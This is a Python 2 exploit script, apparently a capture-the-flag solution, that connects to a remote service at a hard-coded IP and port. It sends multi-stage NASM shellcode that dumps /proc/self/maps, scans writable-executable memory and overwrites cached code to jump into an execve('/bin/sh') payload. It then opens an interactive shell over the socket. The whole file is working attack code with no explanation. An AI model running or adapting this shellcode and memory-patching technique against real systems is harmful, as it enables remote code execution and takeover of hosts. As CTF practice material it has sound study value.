#!/usr/bin/env python2
import subprocess
import socket
import struct
import re
import random

s=socket.socket()
s.connect(("188.40.18.84", 1234))
#s.connect(("127.0.0.1", 1234))

def ru(u):
	d = ""
	while not d.endswith(u):
		c = s.recv(4096)
		assert(c)
		d += c
		#print `d`
	return d

ru('Please input your shellcode, max 4086 bytes, terminate with 8*0x90.\n')

def send_shellcode(*parts):
	shellcode = """
	BITS 64
	DEFAULT REL

	shellcode_start:
	jmp main
	"""
	shellcode += restart_helper
	shellcode += "".join(parts)
	assert(len(shellcode) < 4096)
	file("/tmp/nasm.tmp", "wb").write(shellcode)
	shellcode = subprocess.check_output(["nasm /tmp/nasm.tmp -o/dev/stdout"], shell=True)
	shellcode += "\x90"*8
	raw_input()
	s.sendall(shellcode)

#helpers
debug_helper = """

debug:
xor rdx, rdx
inc rdx
mov rax, rdx
mov rdi, rdx
mov dl, 8
lea rsi, [debug_msg]
syscall
ret

debug_next:
push r15
lea r15, [debug_msg+1]
inc byte [r15]
pop r15
ret

debug_msg:
db "<debug>",10
"""

wait_helper = """
wait_input:
;read(0, rsp, 1)
xor rax, rax
xor rdi, rdi
dec rsp
mov rsi, rsp
xor rdx, rdx
inc rdx
syscall
inc rsp
ret
"""

restart_helper = """
restart:

xor rdx, rdx
mov rax, rdx
mov rdi, rdx
lea rsi, [shellcode_start]
mov dx, 4096
syscall

jmp shellcode_start
"""

dump_maps_shellcode = """
dump_maps:
push rax

;r10 = buffer of 8bytes
mov r10, rsp

;open(maps_filename, 0)
xor rax, rax
mov al, 2
lea rdi, [maps_filename]
xor rsi, rsi
syscall

;r11 = fd
mov r11, rax

;read write loop

dump_maps_loop:

;read(r11, r10, 1)
xor rax, rax
mov rdi, r11
mov rsi, r10
xor rdx, rdx
inc rdx
syscall

cmp rax, 1
jne dump_maps_done

;write(1, r10, 1)
xor rax, rax
inc rax
mov rdi, rax
mov rdx, rax
mov rsi, r10
syscall

jmp dump_maps_loop

dump_maps_done:

;close
xor rax, rax
mov al, 3
mov rdi, r11
syscall

pop rax
ret

maps_filename:
db '/proc/self/maps', 0
"""

read_and_patch_memory_shellcode = """

read_addresses_loop:

;we read addr and size and can now scan them
pop r10 ;addr
pop r11 ;size
sub r11, 7 ;decrease so we wont run out of bounds when we are near the end

lea r15, [dummy]
mov r12, [r15] ;r12 = code we are searching
lea r13, [dummy_replacement]
lea r9, [dummy_replacement + 8]
mov r13, [r13] ;r13 = code we want it to replace with[0]
mov r9, [r9] ;r9 = code we want it to replace with[1]

read_addresses_patch_loop:
mov r14, [r10]

;skip if wrong code
cmp r14, r12
jne read_addresses_next_byte

;skip if original code to not kill cache
cmp r14, r15
jz read_addresses_next_byte

;patch the instructions
call debug
mov [r10], r13
add r10, 8
mov [r10], r9
sub r10, 8

ret

read_addresses_next_byte:

inc r10
dec r11
jne read_addresses_patch_loop

read_addresses:

;make room for addr and size
push rax
push rax

;read(0, rsp, 16)
xor rax, rax
xor rdi, rdi
mov rsi, rsp
xor rdx, rdx
mov dl, 16
syscall

cmp rax, 16
jz read_addresses_loop

pop rax
pop rax
ret

"""

#stage1: dump maps
stage1 = """
lala:
;call dummy many times to force caching
mov rdi, 0x10000
recall_dummy:
call dummy
dec rdi
jne recall_dummy
ret

main:
call wait_input

;patch dummy_replacement
lea r10, [dummy_replacement + 2]
lea r11, [shell]
mov [r10], r11

call lala

call dump_maps
call debug
call read_addresses

call lala

dummy:
mov rax, 0xdeadbeef0badbed0
mov rbx, 0x1010101010101010
ret

dummy_replacement:
mov rax, 0x1010101010101010
;inc byte [0]
jmp rax

shell:
call debug_next
call debug
xor eax, eax
mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
;mov rdi, rsp
push rsp
pop rdi
cdq
push rdx
push rdi
;mov rsi, rsp
push rsp
pop rsi
mov al, 0x3b
syscall
call debug
"""
send_shellcode(stage1, dump_maps_shellcode, read_and_patch_memory_shellcode, debug_helper, wait_helper)
ru(" bytes long shellcode.\n")
s.sendall("X")
maps = ru("\n<debug>\n")

m = maps.split("\n")[:-2]
random.shuffle(m)
for l in m:
	start, end, prot = re.match("^([0-9a-f]+)-([0-9a-f]+) ([rwxp-]+) ", l).groups()
	if not all(x in prot for x in "wxr"):
		continue
	start, end = (int(i, 16) for i in (start, end))
	size = end - start
	print hex(start), hex(size), prot, l
	if size >= 8:
		s.sendall(struct.pack("QQ", start, size))
	#break

s.sendall("X")

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
